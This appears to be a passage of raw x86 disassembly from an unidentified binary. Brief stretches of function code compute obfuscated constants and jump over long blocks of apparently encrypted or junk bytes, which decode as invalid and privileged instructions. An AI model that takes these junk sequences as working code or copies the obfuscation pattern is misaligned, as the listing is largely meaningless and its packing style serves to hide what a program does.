  412197:	icebp  
  412198:	leave  
  412199:	jns    0x412200
  41219b:	xchg   edi,eax
  41219c:	int    0x32
  41219e:	add    ch,BYTE PTR [esi]
  4121a0:	bound  esi,QWORD PTR ds:0xe22584d2
  4121a6:	inc    esi
  4121a7:	fnsave [ebx+ebx*2-0x42]
  4121ab:	loope  0x4121e8
  4121ad:	adc    edi,DWORD PTR [ecx-0x177b95a2]
  4121b3:	xchg   edi,eax
  4121b4:	mov    ebx,0x7c7cf07a
  4121b9:	push   es
  4121ba:	loope  0x4121fa
  4121bc:	fs or  al,0xab
  4121bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c0:	mov    eax,0xa56eba4d
  4121c5:	or     DWORD PTR [edx+0x4cfe1160],ebx
  4121cb:	das    
  4121cc:	sbb    eax,esp
  4121ce:	pop    ebx
  4121cf:	inc    edx
  4121d0:	mov    edi,0x9a597ac6
  4121d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d6:	bnd ret 
  4121d8:	icebp  
  4121d9:	into   
  4121da:	sub    ebx,DWORD PTR [ebp-0x311c1c29]
  4121e0:	das    
  4121e1:	mov    ds:0xfbc71404,eax
  4121e6:	add    al,0xe6
  4121e8:	pop    edx
  4121e9:	mov    esp,0x62574d1f
  4121ee:	inc    ecx
  4121ef:	loope  0x4121e1
  4121f1:	data16 ja 0x41218f
  4121f4:	mov    cl,0x3a
  4121f6:	enter  0x7ebf,0x9b
  4121fa:	iret   
  4121fb:	aaa    
  4121fc:	loopne 0x41224f
  4121fe:	mov    dh,0x2
  412200:	sub    eax,esi
  412202:	jle    0x721a107f
  412208:	xor    al,0x4
  41220a:	aad    0x83
  41220c:	sbb    al,0x68
  41220e:	and    BYTE PTR [ebx-0x3d],bh
  412211:	in     al,0x35
  412213:	test   BYTE PTR [eax],bh
  412215:	add    BYTE PTR [eax],al
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x42262c
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	mov    eax,ds:0xfebe2dac
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	popa   
  4122ae:	lea    esp,[eax-0xa]
  4122b1:	sbb    ah,BYTE PTR [edi+0x6f]
  4122b4:	daa    
  4122b5:	mov    DWORD PTR [esi],esi
  4122b7:	jp     0x412272
  4122b9:	mov    esp,0x664b3579
  4122be:	scas   al,BYTE PTR es:[edi]
  4122bf:	xchg   esp,eax
  4122c0:	jbe    0x412339
  4122c2:	jmp    0x760:0x8d5217a4
  4122c9:	push   esp
  4122ca:	pop    ds
  4122cb:	adc    dl,BYTE PTR [ebx+esi*1-0x14]
  4122cf:	mov    esi,0xf385f868
  4122d4:	sbb    BYTE PTR ds:0xad5be660,al
  4122da:	push   ecx
  4122db:	dec    DWORD PTR [esi]
  4122dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122de:	(bad)  
  4122df:	sbb    bl,BYTE PTR [edi+0x24]
  4122e2:	ja     0x41226e
  4122e4:	arpl   WORD PTR [edx+ebp*2],di
  4122e7:	call   0xc41db2b7
  4122ec:	jae    0x4122d4
  4122ee:	bound  eax,QWORD PTR fs:[esi+0x2f]
  4122f2:	nop
  4122f3:	adc    al,BYTE PTR [edx+0x18]
  4122f6:	into   
  4122f7:	lds    ebx,FWORD PTR [edi+0x5b7028a7]
  4122fd:	dec    ebp
  4122fe:	pop    ecx
  4122ff:	retf   
  412300:	dec    edx
  412301:	fisubr WORD PTR [ecx+0xcf0afaf]
  412307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412308:	or     eax,0x9c8840e9
  41230d:	dec    ecx
  41230e:	nop
  41230f:	fimul  WORD PTR [eax+esi*4-0x18]
  412313:	repnz popf 
  412315:	mov    bh,0x9a
  412317:	fimul  WORD PTR [ebx+edi*4+0x750fe132]
  41231e:	(bad)  
  412320:	xchg   edi,eax
  412321:	jp     0x412318
  412323:	mov    esi,?
  412325:	cwde   
  412326:	je     0x412304
  412328:	out    0x4c,eax
  41232a:	xor    eax,0x9bdd5aba
  41232f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412330:	into   
  412331:	pop    es
  412332:	jp     0x4122df
  412334:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  412336:	pop    esp
  412337:	mov    eax,ds:0xcc8f0eff
  41233c:	or     eax,0x9e422ff9
  412341:	xchg   ecx,eax
  412342:	(bad)  
  412344:	aad    0xa9
  412346:	cmp    edi,edi
  412348:	xchg   DWORD PTR [edx-0x40e427ff],esp
  41234e:	outs   dx,BYTE PTR ds:[esi]
  41234f:	popa   
  412350:	mov    eax,0x328dfa5e
  412355:	cmp    dh,BYTE PTR [edx]
  412357:	cdq    
  412358:	mov    edi,0xfa0ef697
  41235d:	sar    BYTE PTR [edi-0x11],1
  412360:	xor    al,0xa9
  412362:	cwde   
  412363:	jnp    0x412311
  412365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412366:	mov    eax,0xeed93ef7
  41236b:	leave  
  41236c:	pop    ss
  41236d:	xlat   BYTE PTR ds:[ebx]
  41236e:	sbb    cl,cl
  412370:	pop    esi
  412371:	or     edx,DWORD PTR [esi]
  412373:	sub    al,0xb
  412375:	dec    esp
  412376:	dec    esi
  412377:	sub    BYTE PTR [eax],bl
  412379:	mov    al,BYTE PTR [esi+0x11]
  41237c:	(bad)  
  41237d:	push   edi
  41237e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41237f:	cmc    
  412380:	(bad)  
  412382:	aas    
  412383:	retf   0xd332
  412386:	xor    dh,al
  412388:	imul   eax,DWORD PTR [ebx-0x4],0xfffffff7
  41238c:	jns    0x4123ce
  41238e:	cwde   
  41238f:	orps   xmm7,xmm4
  412392:	repnz les edi,FWORD PTR [esi*8+0x14b9b925]
  41239a:	imul   edi,ebx,0x10332753
  4123a0:	out    dx,eax
  4123a1:	icebp  
  4123a2:	sub    ch,BYTE PTR [ecx-0x24ffd2fa]
  4123a8:	sahf   
  4123a9:	js     0x4123c8
  4123ab:	mov    esp,0x42394510
  4123b0:	add    al,0x7f
  4123b2:	mov    ah,0x3d
  4123b4:	push   ds
  4123b5:	ret    0x688d
  4123b8:	inc    edx
  4123b9:	test   BYTE PTR [edi],ah
  4123bb:	lods   al,BYTE PTR ds:[esi]
  4123bc:	leave  
  4123bd:	rol    DWORD PTR [ebp-0x80],1
  4123c0:	adc    dl,BYTE PTR [ebp+0x335c1ab8]
  4123c6:	into   
  4123c7:	and    esp,DWORD PTR ds:[ecx]
  4123ca:	scas   eax,DWORD PTR es:[edi]
  4123cb:	retf   0xcc47
  4123ce:	hlt    
  4123cf:	adc    BYTE PTR [edi+eax*1],cl
  4123d2:	sub    eax,DWORD PTR [ecx]
  4123d4:	xchg   edx,eax
  4123d5:	jbe    0x4123ab
  4123d7:	ss mov eax,0x1186fc27
  4123dd:	push   edx
  4123de:	cwde   
  4123df:	(bad)  
  4123e0:	loop   0x412437
  4123e2:	punpcklwd mm3,DWORD PTR [edx]
  4123e5:	and    BYTE PTR [eax+0x5e],ch
  4123e8:	sahf   
  4123e9:	icebp  
  4123ea:	stos   BYTE PTR es:[edi],al
  4123eb:	sar    DWORD PTR [ebx+0x62087adc],0x30
  4123f2:	call   0xee63:0x51aaa7db
  4123f9:	ja     0x412402
  4123fb:	and    DWORD PTR [ebp+0x4156a3a6],ecx
  412401:	pop    es
  412402:	pop    edx
  412403:	pop    ds
  412404:	xchg   esi,eax
  412405:	jne    0x412477
  412407:	frstor [esi+0x2da756ca]
  41240d:	outs   dx,BYTE PTR ds:[esi]
  41240e:	test   DWORD PTR [ebx-0x2a],edi
  412411:	adc    DWORD PTR ds:0x14cd9abb,esp
  412417:	xchg   edx,eax
  412418:	call   0xbc89:0xc1005dbc
  41241f:	adc    al,0x1b
  412421:	sar    BYTE PTR [eax-0x54],cl
  412424:	test   BYTE PTR [edx+0x2c4ef249],bh
  41242a:	and    ah,BYTE PTR [edi+0x61c17ffd]
  412430:	in     al,dx
  412431:	lea    ebp,[edx-0x67424682]
  412437:	ficomp WORD PTR [ebx]
  412439:	dec    eax
  41243a:	ja     0x412414
  41243c:	mov    ds:0x6bf36dc1,eax
  412441:	adc    al,0xb7
  412443:	mov    eax,ds:0xfed32fbb
  412448:	sub    ebp,ecx
  41244a:	into   
  41244b:	inc    ebp
  41244c:	outs   dx,BYTE PTR ds:[esi]
  41244d:	adc    edi,DWORD PTR [edx-0x5ddc3094]
  412453:	push   0x2cfabf98
  412458:	out    0x61,eax
  41245a:	lock mov ch,0x3d
  41245d:	fmul   QWORD PTR [eax]
  41245f:	inc    esp
  412460:	sbb    eax,0xf9fd8eb
  412465:	ins    BYTE PTR es:[edi],dx
  412466:	(bad)  
  412469:	mov    al,0xee
  41246b:	mul    DWORD PTR [edi+edx*4]
  41246e:	jne    0x412497
  412470:	dec    ebx
  412471:	push   cs
  412472:	lahf   
  412473:	push   ebp
  412474:	scas   eax,DWORD PTR es:[edi]
  412475:	aas    
  412476:	pushf  
  412477:	retf   0x7d87
  41247a:	adc    eax,0x8c115594
  41247f:	shl    DWORD PTR [eax-0x4a],0x4d
  412483:	lea    esp,[ecx+0xd]
  412486:	or     BYTE PTR [eax-0x5],ch
  412489:	dec    eax
  41248a:	and    esi,DWORD PTR [eax]
  41248c:	das    
  41248d:	lock sbb eax,0xd038b215
  412493:	jmp    0x334f9671
  412498:	lahf   
  412499:	jae    0x41248d
  41249b:	pop    eax
  41249c:	push   eax
  41249d:	aaa    
  41249e:	std    
  41249f:	inc    ebx
  4124a0:	test   DWORD PTR [edi+0x45],eax
  4124a3:	rcl    DWORD PTR [esi],1
  4124a5:	das    
  4124a6:	cld    
  4124a7:	in     al,0x5d
  4124a9:	jae    0x41250c
  4124ab:	mov    ah,0xc0
  4124ad:	cmc    
  4124ae:	dec    edi
  4124af:	mov    bl,0x18
  4124b1:	outs   dx,DWORD PTR ds:[esi]
  4124b2:	hlt    
  4124b3:	jnp    0x4124d5
  4124b5:	icebp  
  4124b6:	pop    ebp
  4124b7:	mov    edi,0x55f3332c
  4124bc:	mov    dh,0xa6
  4124be:	mov    ch,0x58
  4124c0:	out    dx,eax
  4124c1:	lds    edi,FWORD PTR [ecx+ebp*2-0x45]
  4124c5:	jg     0x4124cc
  4124c7:	es pop ds
  4124c9:	jnp    0x41250a
  4124cb:	ins    BYTE PTR es:[edi],dx
  4124cc:	(bad)  
  4124cd:	icebp  
  4124ce:	pusha  
  4124cf:	jae    0x412529
  4124d1:	les    edx,FWORD PTR [ebp-0x69]
  4124d4:	test   DWORD PTR [ebx],ebx
  4124d6:	(bad)  [edx-0x9f406c3]
  4124dc:	outs   dx,BYTE PTR ds:[esi]
  4124dd:	mov    edx,0xce5714a
  4124e2:	clc    
  4124e3:	add    eax,0xba77a247
  4124e8:	in     al,0xa7
  4124ea:	test   al,0x88
  4124ec:	popf   
  4124ed:	out    dx,al
  4124ee:	push   ss
  4124ef:	test   edi,0xd578c95
  4124f5:	sbb    eax,0xd2333d4a
  4124fa:	jmp    0xb5fd:0x325952da
  412501:	test   ebx,esp
  412503:	rcl    BYTE PTR [edi+0x3],cl
  412506:	rcl    BYTE PTR [ebx],1
  412508:	icebp  
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x4220ab
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x412598
  412538:	and    ecx,DWORD PTR [ebx+0x7e]
  41253b:	push   edi
  41253c:	pop    esp
  41253d:	sbb    BYTE PTR [eax],bl
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	pop    esi
  412544:	aaa    
  412545:	loop   0x41253e
  412547:	jge    0x412569
  412549:	sbb    DWORD PTR [edi],ecx
  41254b:	mov    esi,0xf6400d1a
  412550:	jae    0x412544
  412552:	test   eax,0x13aff649
  412557:	in     al,0xaa
  412559:	dec    ebp
  41255a:	stos   DWORD PTR es:[edi],eax
  41255b:	jp     0x41250c
  41255d:	or     BYTE PTR [ebp+0xf6b0dff],bl
  412563:	xchg   esi,eax
  412564:	xchg   esp,eax
  412565:	out    dx,al
  412566:	dec    cx
  412568:	stc    
  412569:	inc    eax
  41256a:	inc    esi
  41256b:	addr16 mov dh,0xba
  41256e:	(bad)  
  41256f:	mul    DWORD PTR [ebx+esi*4+0x101d46ad]
  412576:	or     eax,esi
  412578:	test   DWORD PTR [ecx-0x39],edx
  41257b:	call   0xe9a1:0xeb53f89d
  412582:	mov    ebp,0xd18e59f5
  412587:	push   cs
  412588:	fistp  WORD PTR [edx-0xa333551]
  41258e:	add    ah,BYTE PTR [ebx+0x7c]
  412591:	sahf   
  412592:	push   edx
  412593:	sub    DWORD PTR [ecx+0x25],esp
  412596:	ss jecxz 0x412574
  412599:	mov    ds:0xa7b7529,eax
  41259e:	jno    0x412618
  4125a0:	push   ebx
  4125a1:	out    0xf8,eax
  4125a3:	xor    al,0xbb
  4125a5:	in     eax,dx
  4125a6:	sbb    edx,esp
  4125a8:	dec    esi
  4125a9:	mov    edi,DWORD PTR [eax]
  4125ab:	lock inc edx
  4125ad:	(bad)  
  4125ae:	sub    al,0x32
  4125b0:	mov    dh,0x56
  4125b2:	mov    edi,0xda36e1af
  4125b7:	fstp   QWORD PTR [edi+eax*1-0x73]
  4125bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125bc:	test   DWORD PTR [esi],edx
  4125be:	dec    ebx
  4125bf:	xchg   esp,eax
  4125c0:	adc    DWORD PTR [ecx],ebx
  4125c2:	sub    eax,0x24342cbd
  4125c7:	dec    esi
  4125c8:	jg     0x412578
  4125ca:	outs   dx,BYTE PTR ds:[esi]
  4125cb:	fsub   st,st(0)
  4125cd:	sub    bl,ah
  4125cf:	clc    
  4125d0:	push   0xffffff9d
  4125d2:	xlat   BYTE PTR ds:[ebx]
  4125d3:	xchg   ebp,eax
  4125d4:	(bad)  
  4125d5:	cmp    eax,eax
  4125d7:	in     eax,0x13
  4125d9:	vpcmpeqb xmm5,xmm4,xmm4
  4125dd:	pop    es
  4125de:	(bad)  
  4125df:	xor    eax,0x16ede6e1
  4125e4:	cmp    BYTE PTR [esi-0x52],dl
  4125e7:	mov    dl,0xa4
  4125e9:	add    DWORD PTR [edi+0x72e3e91c],ecx
  4125ef:	xor    BYTE PTR [eax+0x4],cl
  4125f2:	stos   BYTE PTR es:[edi],al
  4125f3:	out    0xda,al
  4125f5:	shl    DWORD PTR ds:0x1f890e07,cl
  4125fb:	stos   DWORD PTR es:[edi],eax
  4125fc:	mov    al,BYTE PTR [esp+ebx*2]
  4125ff:	fwait
  412600:	cmovg  esi,DWORD PTR [ebx+0x48f8c14d]
  412607:	and    DWORD PTR [ebx+edi*8],eax
  41260a:	dec    ebp
  41260b:	mov    edi,0x2e79b4d4
  412610:	jno    0x4125e0
  412612:	clc    
  412613:	pop    edx
  412614:	inc    eax
  412615:	sbb    eax,DWORD PTR [eax-0x33]
  412618:	dec    esp
  412619:	add    DWORD PTR [esi-0x798da0d6],ebp
  41261f:	cmp    al,0xcc
  412621:	retf   
  412622:	int    0x80
  412624:	inc    esp
  412625:	mov    dl,0x6b
  412627:	xchg   ecx,eax
  412628:	adc    eax,0x7f47cfd3
  41262d:	mov    cl,0xcc
  41262f:	mov    ecx,0xb27b0c59
  412634:	adc    DWORD PTR [edi],edx
  412636:	push   eax
  412637:	(bad)  
  412638:	loopne 0x41262a
  41263a:	leave  
  41263b:	and    dh,ah
  41263d:	and    BYTE PTR [edi-0x3b3dcf77],bl
  412643:	jmp    0x8202b0f5
  412648:	fidiv  DWORD PTR [esi+0x5055f4a9]
  41264e:	push   ebp
  41264f:	cmp    esp,DWORD PTR [ebp-0x4c5c031f]
  412655:	fisttp QWORD PTR [edx-0x770e5f09]
  41265b:	mov    gs,WORD PTR [ebx+ebx*2+0x56]
  41265f:	xor    bh,BYTE PTR ss:[ecx]
  412662:	cmp    al,0x61
  412664:	push   esi
  412665:	int    0xe5
  412667:	pop    ebx
  412668:	or     ebp,DWORD PTR [esi-0x75]
  41266b:	(bad)  
  41266c:	pop    esi
  41266d:	repnz imul eax,DWORD PTR [ebx+0x357ec474],0x6a9fd7ca
  412678:	dec    eax
  412679:	mov    al,0x1a
  41267b:	lea    ecx,[edx-0x26e63331]
  412681:	mov    BYTE PTR [eax-0x58],ch
  412684:	jb     0x4126ca
  412686:	xchg   ecx,eax
  412687:	cmp    cl,BYTE PTR [eax-0x660d55e4]
  41268d:	jg     0x4126a5
  41268f:	outs   dx,DWORD PTR ds:[esi]
  412690:	xchg   DWORD PTR [edi],ecx
  412692:	aaa    
  412693:	(bad)  
  412694:	xchg   ebx,eax
  412695:	mov    eax,0x8bcc2226
  41269a:	jo     0x412660
  41269c:	mov    ebx,0x422378da
  4126a1:	shr    BYTE PTR ds:0x806d8f4,0xaf
  4126a8:	inc    edx
  4126a9:	sub    edx,DWORD PTR [ebx+ebp*4]
  4126ac:	inc    esp
  4126ad:	ror    DWORD PTR [eax+ecx*4],0xb6
  4126b1:	std    
  4126b2:	xor    cl,BYTE PTR [ebp-0x4b69569b]
  4126b8:	or     al,0x80
  4126ba:	pop    ecx
  4126bb:	and    BYTE PTR [esi-0x51],al
  4126be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126c0:	or     dh,BYTE PTR [eax+0x1372bccd]
  4126c6:	cmp    cl,ch
  4126c8:	push   edi
  4126c9:	out    0x60,eax
  4126cb:	ffreep st(7)
  4126cd:	addr16 loop 0x4126f2
  4126d0:	ja     0x41271e
  4126d2:	jp     0x4126f6
  4126d4:	add    dl,BYTE PTR [esi-0x6f96edf]
  4126da:	dec    ebx
  4126db:	fistp  DWORD PTR ds:0xc2c54b4b
  4126e1:	test   esp,0x15c583bf
  4126e7:	mov    eax,0x17e71922
  4126ec:	sbb    edi,DWORD PTR [esp+ebx*2]
  4126ef:	out    dx,al
  4126f0:	mov    eax,ds:0x20f84b51
  4126f5:	dec    eax
  4126f6:	imul   edi,DWORD PTR [esi+ebp*8+0x4556d835],0xfffffff3
  4126fe:	rcr    BYTE PTR [eax+0x27b99cc5],0xe3
  412705:	mov    al,ds:0xd0c1a1db
  41270a:	ret    
  41270b:	jno    0x412729
  41270d:	add    DWORD PTR [edi],ebx
  41270f:	sub    al,0x97
  412711:	adc    al,0xe5
  412713:	sub    al,0xfe
  412715:	cmp    al,0x80
  412717:	mov    al,ds:0x3737e7c8
  41271c:	mov    al,ds:0xfdc197c0
  412721:	loop   0x412721
  412723:	mov    dh,0x4a
  412725:	add    al,0xe1
  412727:	jmp    0x13899084
  41272c:	push   ecx
  41272d:	jno    0x41279b
  41272f:	mov    cl,0x2d
  412731:	mov    ah,0xfb
  412733:	int    0x53
  412735:	je     0x4126bb
  412737:	dec    edi
  412738:	iret   
  412739:	out    0x64,al
  41273b:	aam    0x7
  41273d:	jecxz  0x4127aa
  41273f:	push   cs
  412740:	fmul   st(1),st
  412742:	ins    DWORD PTR es:[edi],dx
  412743:	shl    BYTE PTR [ebx],1
  412745:	arpl   WORD PTR [ebx],cx
  412747:	sub    dh,BYTE PTR [edi+0x33836497]
  41274d:	jge    0x4126f2
  41274f:	retf   
  412750:	fsubr  QWORD PTR [edi]
  412752:	repz clc 
  412754:	sbb    ah,BYTE PTR [edx+0x5a]
  412757:	jmp    0x8213:0x1d15bb00
  41275e:	(bad)  
  41275f:	rcl    BYTE PTR [ebx+ecx*8+0x7219f059],0xf2
  412767:	into   
  412768:	sti    
  412769:	mov    ebp,0xe8f372da
  41276e:	in     eax,dx
  41276f:	cdq    
  412770:	adc    BYTE PTR [eax-0x2e],dl
  412773:	xchg   esp,eax
  412774:	and    DWORD PTR [ecx],ebx
  412776:	lds    esp,FWORD PTR [ebx-0x61]
  412779:	mov    edx,0x6263e511
  41277e:	inc    edx
  41277f:	jb     0x4127e8
  412781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412783:	jge    0x412758
  412785:	sti    
  412786:	cli    
  412787:	lock pop eax
  412789:	scas   al,BYTE PTR es:[edi]
  41278a:	fdivrp st(0),st
  41278c:	xor    BYTE PTR ds:0x6ad57fe1,bl
  412792:	inc    ebp
  412793:	out    dx,al
  412794:	aam    0xe4
  412796:	adc    al,0x73
  412798:	adc    esp,ebp
  41279a:	sti    
  41279b:	sbb    eax,edx
  41279d:	mov    edx,DWORD PTR ds:0x42262c
  4127a3:	xor    esi,esi
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x42262c
  4127d5:	mov    ds:0x422634,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0xbca75a2a
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    BYTE PTR [ecx],bh
  4128b3:	push   esi
  4128b4:	push   esi
  4128b5:	loope  0x4128d7
  4128b7:	es dec edx
  4128b9:	cld    
  4128ba:	imul   ecx,DWORD PTR [eax+0x4ca5ad61],0x6a359ce7
  4128c4:	jg     0x4128cf
  4128c6:	sub    eax,0x701d5
  4128cb:	and    BYTE PTR [ebp-0x10c6ab5c],ah
  4128d1:	jmp    0x35be:0x79f7756e
  4128d8:	inc    edi
  4128d9:	in     al,0x95
  4128db:	adc    al,0xa9
  4128dd:	cmp    BYTE PTR [edi+0x2c],dh
  4128e0:	daa    
  4128e1:	cs or  al,0xde
  4128e4:	xchg   BYTE PTR [edi+0x59],ch
  4128e7:	mov    DWORD PTR [eax+0xf],edi
  4128ea:	push   ebp
  4128eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128ec:	sahf   
  4128ed:	test   BYTE PTR [edx],ch
  4128ef:	std    
  4128f0:	retf   
  4128f1:	or     eax,DWORD PTR ds:0xfb8b782a
  4128f7:	and    bl,BYTE PTR [ecx+eax*2]
  4128fa:	stc    
  4128fb:	mov    BYTE PTR [edx+0xc],al
  4128fe:	outs   dx,DWORD PTR ds:[esi]
  4128ff:	retf   0xe550
  412902:	fldcw  WORD PTR [esi+0x259bc7bb]
  412908:	fnstcw WORD PTR [edi+edx*1]
  41290b:	and    DWORD PTR [eax+eiz*1],esp
  41290e:	push   eax
  41290f:	jmp    0x4128fb
  412911:	jecxz  0x41293c
  412913:	jb     0x4128d4
  412915:	sahf   
  412916:	js     0x4128e4
  412918:	fdivr  st,st(7)
  41291a:	mov    bl,0xf4
  41291c:	xchg   BYTE PTR [ebx+0x6c],cl
  41291f:	(bad)  
  412920:	cli    
  412921:	inc    ecx
  412922:	sti    
  412923:	std    
  412924:	retf   0xad72
  412927:	inc    edi
  412928:	mov    ecx,edx
  41292a:	(bad)  
  41292b:	lock mov gs,WORD PTR [esi]
  41292e:	mov    ch,0xf0
  412930:	and    eax,DWORD PTR [ebx]
  412932:	in     al,dx
  412933:	hlt    
  412934:	aad    0xf0
  412936:	cmp    eax,0xe38142bc
  41293b:	jo     0x41296b
  41293d:	adc    BYTE PTR [ebx+0x6d82459c],bl
  412943:	xor    eax,0xe2bb6911
  412948:	mov    edx,0x30c7cbd6
  41294d:	dec    eax
  41294e:	mov    esi,0x3fa9044f
  412953:	push   0xffffff8a
  412955:	inc    esp
  412956:	aaa    
  412957:	dec    ebx
  412958:	aaa    
  412959:	cmp    dl,al
  41295b:	sub    DWORD PTR [eax],ebp
  41295d:	int    0x90
  41295f:	push   es
  412960:	add    DWORD PTR [ecx+eiz*2],0xf5014fe7
  412967:	sub    eax,0x1b
  41296a:	add    edi,DWORD PTR [ecx+ecx*8+0x5e]
  41296e:	imul   edx,DWORD PTR [edx],0x7066d02a
  412974:	scas   eax,DWORD PTR es:[edi]
  412975:	sbb    eax,0x2958a5c7
  41297a:	inc    ebx
  41297b:	arpl   di,bp
  41297d:	jno    0x412913
  41297f:	xor    eax,0xcfc0e4c1
  412984:	jg     0x412987
  412986:	cmp    dh,ah
  412988:	mov    esp,0x3685f355
  41298d:	xchg   edi,eax
  41298e:	adc    DWORD PTR [ecx],0x9
  412991:	ficomp WORD PTR [edx+0x57]
  412994:	pop    ss
  412995:	mov    al,0x56
  412997:	pop    eax
  412998:	add    DWORD PTR [edx],esi
  41299a:	mov    dl,0xc8
  41299c:	psllq  mm2,QWORD PTR [esi]
  41299f:	pop    edi
  4129a0:	bound  ecx,QWORD PTR [edx-0x74]
  4129a3:	(bad)  
  4129a4:	cmp    al,cl
  4129a6:	test   eax,esp
  4129a8:	xlat   BYTE PTR ds:[ebx]
  4129a9:	mov    BYTE PTR [ebp+0x7],bh
  4129ac:	jnp    0x41299e
  4129ae:	add    BYTE PTR [edx+edi*4],0x87
  4129b2:	cdq    
  4129b3:	xor    BYTE PTR [edx],0x98
  4129b6:	(bad)  
  4129b7:	out    0xe8,al
  4129b9:	pusha  
  4129ba:	xchg   ebx,eax
  4129bb:	mov    ecx,0x288723e0
  4129c0:	aam    0x3e
  4129c2:	xchg   ch,ah
  4129c4:	daa    
